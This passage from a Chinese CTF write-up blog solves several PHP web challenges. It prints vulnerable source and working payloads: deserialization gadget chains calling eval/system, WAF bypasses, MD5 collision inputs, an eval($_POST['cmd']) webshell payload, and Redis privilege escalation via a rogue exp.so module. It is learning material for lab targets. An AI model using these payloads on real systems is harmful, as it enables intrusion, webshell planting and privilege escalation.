条件成立，触发 file_get_contents()，你就拿到了 flag。</span><br><span class="line"></span><br><span class="line">✅ 总结你的问题「为什么 null 可以继续使用？」</span><br><span class="line">行为	解释</span><br><span class="line">unserialize(null)	返回 false</span><br><span class="line">false-&gt;property = ...	会触发 PHP 的自动转型机制，变为 stdClass 对象</span><br><span class="line">stdClass 默认属性不存在时	读取时为 null，与 $heat = null 相等</span><br><span class="line">所以 neutron === nova 成立	进而成功读取 flag.php</span><br><span class="line">✅ 利用的“黑魔法”是：</span><br><span class="line"></span><br><span class="line">false-&gt;property = xxx</span><br><span class="line"></span><br><span class="line">→ PHP 自动将 false 转为 stdClass 对象并赋值。</span><br><span class="line"></span><br><span class="line">如果你还需要我帮你构造一个 payload 示例，或者写成 Base64 / URL 编码格式的 GET 参数，我也可以帮你生成。只管说</span><br></pre></td></tr></table></figure>
<p>就是为空了，php会把这个当作sta Class<br>里面什么都没有，你再调用，自然也是null。肯定满足强相等<br>也不管你这个$heat等于什么了<br>然后就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$heat=&quot;asdasdasdasd53asd3a1sd3a1sd3asd&quot;;</span><br><span class="line">$flag=&quot;flag in /nssctfasdasdflag&quot;;</span><br></pre></td></tr></table></figure>
<p>发现什么也没有读到，这里我们选择<br>读<code>../nssctfasdasdflag</code></p>
<h1 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h1><p>1分<br>反序列化PHP伪协议PHP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// flag.php</span><br><span class="line">class teacher&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $rank;</span><br><span class="line">    private $salary;</span><br><span class="line">    public function __construct($name,$rank,$salary = 10000)&#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;rank = $rank;</span><br><span class="line">        $this-&gt;salary = $salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class classroom&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $leader;</span><br><span class="line">    public function __construct($name,$leader)&#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;leader = $leader;</span><br><span class="line">    &#125;</span><br><span class="line">    public function hahaha()&#123;</span><br><span class="line">        if($this-&gt;name != &#x27;one class&#x27; or $this-&gt;leader-&gt;name != &#x27;ing&#x27; or $this-&gt;leader-&gt;rank !=&#x27;department&#x27;)&#123;</span><br><span class="line">            return False;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            return True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class school&#123;</span><br><span class="line">    public $department;</span><br><span class="line">    public $headmaster;</span><br><span class="line">    public function __construct($department,$ceo)&#123;</span><br><span class="line">        $this-&gt;department = $department;</span><br><span class="line">        $this-&gt;headmaster = $ceo;</span><br><span class="line">    &#125;</span><br><span class="line">    public function IPO()&#123;</span><br><span class="line">        if($this-&gt;headmaster == &#x27;ong&#x27;)&#123;</span><br><span class="line">            echo &quot;Pretty Good ! Ctfer!\n&quot;;</span><br><span class="line">            echo new $_POST[&#x27;a&#x27;]($_POST[&#x27;b&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if($this-&gt;department-&gt;hahaha()) &#123;</span><br><span class="line">            $this-&gt;IPO();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;d&#x27;]))&#123;</span><br><span class="line">    unserialize(base64_decode($_GET[&#x27;d&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里有我们的代码<br>这个整体的逻辑都还是挺简单的，我们需要注意这里，特别是就是new了我们传入的对象，接下来我们应该怎么来拿到flag。自己再构造一个类吗？<br>这里用php的原生类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>最后拿到flag</p>
<h1 id="SWPUCTF-2022-新生赛-ez-1zpop"><a href="#SWPUCTF-2022-新生赛-ez-1zpop" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_1zpop"></a>[SWPUCTF 2022 新生赛]ez_1zpop</h1><p>1分<br>反序列化弱比较PHP<br>这个也比较简单，不多说了</p>
<h1 id="MoeCTF-2021-unserialize"><a href="#MoeCTF-2021-unserialize" class="headerlink" title="[MoeCTF 2021]unserialize"></a>[MoeCTF 2021]unserialize</h1><p>1分<br>反序列化PHPRCE<br>题目描述</p>
<p><a target="_blank" rel="noopener" href="https://github.com/XDSEC/moeCTF_2021">https://github.com/XDSEC/moeCTF_2021</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">class entrance</span><br><span class="line">&#123;</span><br><span class="line">    public $start;</span><br><span class="line"></span><br><span class="line">    function __construct($start)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;start = $start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;start-&gt;helloworld();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class springboard</span><br><span class="line">&#123;</span><br><span class="line">    public $middle;</span><br><span class="line"></span><br><span class="line">    function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class evil</span><br><span class="line">&#123;</span><br><span class="line">    public $end;</span><br><span class="line"></span><br><span class="line">    function __construct($end)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;end = $end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __get($Attribute)</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;serialize&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;serialize&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这个一进去是源码，就三个类，理论上应该就是不难的<br>构造的时候，我发现了自己的问题，__call是方法，__get是变量<br>还有就是我要eval函数时，外面给了eval，我们需要这样赋值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval($this-&gt;end);</span><br><span class="line">$c-&gt;end = &quot;system(&#x27;ls /&#x27;);&quot;;</span><br></pre></td></tr></table></figure>
<p>这样拿到flag</p>
<h1 id="FSCTF-2023-EZ-eval"><a href="#FSCTF-2023-EZ-eval" class="headerlink" title="[FSCTF 2023]EZ_eval"></a>[FSCTF 2023]EZ_eval</h1><p>1分<br>RCE空格绕过WAF绕过<br>一进去，发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(isset($_GET[&#x27;word&#x27;]))&#123;</span><br><span class="line">    $word = $_GET[&#x27;word&#x27;];</span><br><span class="line">    if (preg_match(&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;, $word))&#123;</span><br><span class="line">       die(&quot;nonono.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $word = str_replace(&quot;?&quot;, &quot;&quot;, $word);</span><br><span class="line">    eval(&quot;?&gt;&quot;. $word);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你看上面的这个，会再前面加上?&gt;,然后就是后面的代码不会再当成php来执行了<br>过滤问号-<script></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;system(&#x27;ls /&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>过滤空格-%09</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script%09language=&#x27;php&#x27;&gt;system(&#x27;ls%09/&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>这里<code>strings``paste``sort</code>都是可以的，又学到了</p>
<h1 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h1><p>1分<br>反序列化RCERedis<br>代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $code = &quot;&quot;;</span><br><span class="line">    function __call($method,$args)&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;code = &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_REQUEST[&#x27;poc&#x27;]))&#123;</span><br><span class="line">    preg_match_all(&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;,$_REQUEST[&#x27;poc&#x27;],$ret);</span><br><span class="line">    if (isset($ret[1])) &#123;</span><br><span class="line">        foreach ($ret[1] as $i) &#123;</span><br><span class="line">            if(intval($i)!==1)&#123;</span><br><span class="line">                exit(&quot;you want to bypass wakeup ? no !&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($_REQUEST[&#x27;poc&#x27;]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>第一步就是对于反序列化的绕过，实现最基本的phpinfo()<br>第二步就是连接蚁剑，getshell，但是发现权限不够<br>第三步就是提权拿到flag<br>首先，我们在这里补充一个蚁剑会遇到的问题，就是插件的下载很慢<br>放一下大佬的文章参考，搜蚁剑插件下载关键词基本就出来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_52116519/article/details/123962077?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522a22019e9466dd1aaa8173abc6e0dc11a%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=a22019e9466dd1aaa8173abc6e0dc11a&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-123962077-null-null.142^v102^pc_search_result_base4&amp;utm_term=%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;spm=1018.2226.3001.4187</span><br></pre></td></tr></table></figure>
<p>方法一：首先肯定是绕过disable_functions插件（我安装插件的时候遇到了很多问题，又重新安装了这些，非常费工夫，主要是梯子端口这个方面）（因为一般是7890这个端口，但是我之前为了搭建一个静态博客改为了7891了）<br>安好了这个插件之后，我们可以使用这个插件，然后选择模式<code>php_7UserFilter</code>，这个就直接getshell了，我们tac /flagaasdbjanssctf<br>这个就直接拿到flag了<br>方法二：下载并加载蚁剑Redis插件并连接Redis服务，向/var/www/html上传恶意.so文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在开发人员使用 vim 编辑器 编辑文本时，系统会自动生成一个备份文件，当编辑完成后，保存时，原文件会更新，备份文件会被自动删除。</span><br><span class="line">但是，当编辑操作意外终止时，这个备份文件就会保留，如果多次编辑文件都意外退出，备份文件并不会覆盖，而是以 swp、swo、swn 等其他格式，依次备份。</span><br></pre></td></tr></table></figure>
<p>我们打开这个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Redis的主从复制</span><br><span class="line">Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机(master)，其他实例都作为备份机(slave)，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</span><br><span class="line"></span><br><span class="line">Redis模块</span><br><span class="line"></span><br><span class="line">在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。编写恶意so文件的代码: https://github.com/Dliv3/redis-rogue-server</span><br><span class="line"></span><br><span class="line">利用原理</span><br><span class="line"></span><br><span class="line">在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。很多主从复制导致任意命令执行都是通过Redis的未授权访问漏洞导致了横向移动攻击方式的发生。</span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">                            版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</span><br><span class="line">                        </span><br><span class="line">原文链接：https://blog.csdn.net/qq_46266259/article/details/128891937</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">经过整理，和分析，发现这是redis的连接,后面是密码,所以我们要上传一下连接redis的文件</span><br><span class="line"></span><br><span class="line">这里要下载exp.so文件，并进行利用，简单解释一下exp.so文件</span><br><span class="line"></span><br><span class="line">    Redis 中的 exp.so 文件通常被用作 Redis 提权的一种方式。这个文件是一个 Redis 模块，它可以在 Redis 服务器中执行任意代码。</span><br><span class="line"></span><br><span class="line">    Redis 模块是一种可插拔的扩展，它允许用户在 Redis 服务器中添加新的功能。exp.so 文件是一个 Redis 模块，它提供了一些命令和功能，可以让攻击者在 Redis 服务器中执行任意代码，从而获得服务器的控制权。</span><br><span class="line"></span><br><span class="line">    在 Redis 提权攻击中，攻击者通常会利用 Redis 的漏洞或者弱密码，获取 Redis 服务器的访问权限。一旦攻击者获得了访问权限，他们就可以上传 exp.so 文件到 Redis 服务器中，并使用 Redis 的 module load 命令加载这个文件。这个文件会在 Redis 服务器中执行任意代码，从而让攻击者获得服务器的控制权。</span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">                            版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</span><br><span class="line">                        </span><br><span class="line">原文链接：https://blog.csdn.net/Leaf_initial/article/details/130229424</span><br></pre></td></tr></table></figure>
<p>exp.so文件地址下载：<a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a><br>上传exp.so文件，上传到和备份文件一个目录下的<br>首先先右键，选择插件，进入<br>前面的备份文件出现了<code>define(&quot;REDIS_PASS&quot;,&quot;you_cannot_guess_it&quot;</code><br>后面的就是密码了<br>然后你发现它有很多什么0，1，2，选择一个进入终端<br>输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MODULE LOAD /var/www/html/exp.so</span><br></pre></td></tr></table></figure>
<p>最后就可以命令执行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system.exec &quot;ls /&quot;</span><br><span class="line">system.exec &quot;cat /flagaasdbjanssctf&quot;</span><br></pre></td></tr></table></figure>
<p>并且我是了，不在这个虚拟终端去另外一个的话，是不能执行我们的命令的<br>对了，还没有说怎么写入木马，一个是那个正则的意思就是不能AB这个大写，改为小写就可以了，还有一个就是wakeup的简单绕过，最后写入木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $code = &quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$b = new B();</span><br><span class="line">$b-&gt;a = $a;</span><br><span class="line">echo(serialize($b));</span><br><span class="line">//O:1:&quot;B&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;s:1:&quot;b&quot;;N;&#125;</span><br><span class="line">//修改后 O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;s:1:&quot;b&quot;;N;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $code = &#x27;eval($_POST[&quot;cmd&quot;]);&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$b = new B();</span><br><span class="line">$b-&gt;a = $a;</span><br><span class="line">echo(serialize($b));</span><br><span class="line">//O:1:&quot;B&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&quot;cmd&quot;]);&quot;;&#125;s:1:&quot;b&quot;;N;&#125;</span><br><span class="line">//修改后 O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&quot;cmd&quot;]);&quot;;&#125;s:1:&quot;b&quot;;N;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="FSCTF-2023-ez-php1"><a href="#FSCTF-2023-ez-php1" class="headerlink" title="[FSCTF 2023]ez_php1"></a>[FSCTF 2023]ez_php1</h1><p>1分<br>反序列化PHPRCE<br>题目描述</p>
<p>do you know point?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;globals.php&quot;;</span><br><span class="line">$a = $_GET[&#x27;b&#x27;];</span><br><span class="line">$b = $_GET[&#x27;a&#x27;];</span><br><span class="line">if($a!=$b&amp;&amp;md5($a)==md5($b))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;!!!&quot;;</span><br><span class="line">    $c = $_POST[&#x27;FL_AG&#x27;];</span><br><span class="line">    if(isset($c))</span><br><span class="line">    &#123;</span><br><span class="line">        if (preg_match(&#x27;/^.*(flag).*$/&#x27;, $ja)) &#123;</span><br><span class="line">            echo &#x27;You are bad guy!!!&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                echo &quot;Congratulation!!&quot;;</span><br><span class="line">                echo $hint1;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;Please input my love FL_AG&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;game over!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>我们这里输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:?b=QLTHNDT&amp;a=QNKCDZO</span><br><span class="line">post:FL_AG=fl</span><br></pre></td></tr></table></figure>
<p>没有看懂那个正则什么意思，但是它还是给了地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L0vey0U.php</span><br></pre></td></tr></table></figure>
<p>我们进入下一关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;globals.php&quot;;</span><br><span class="line">$FAKE_KEY = &quot;Do you love CTF?&quot;;</span><br><span class="line">$KEY = &quot;YES I love&quot;;</span><br><span class="line">$str = $_GET[&#x27;str&#x27;];</span><br><span class="line">echo $flag;</span><br><span class="line">if (unserialize($str) === &quot;$KEY&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$hint2&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">flag&#123;This_is_fake_flag&#125;</span><br></pre></td></tr></table></figure>
<p>第二关的paylaod很简单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=&#x27;YES I love&#x27;;</span><br><span class="line">echo serialize($str);</span><br><span class="line">结果：s:10:&quot;YES I love&quot;;</span><br></pre></td></tr></table></figure>
<p>进入下一关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Clazz</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = file_get_contents(&quot;php://filter/read=convert.base64-encode/resource=g0t_f1ag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unserialize($_POST[&#x27;data&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>最后一关paylaod，主要就是地址要赋值上去</p>
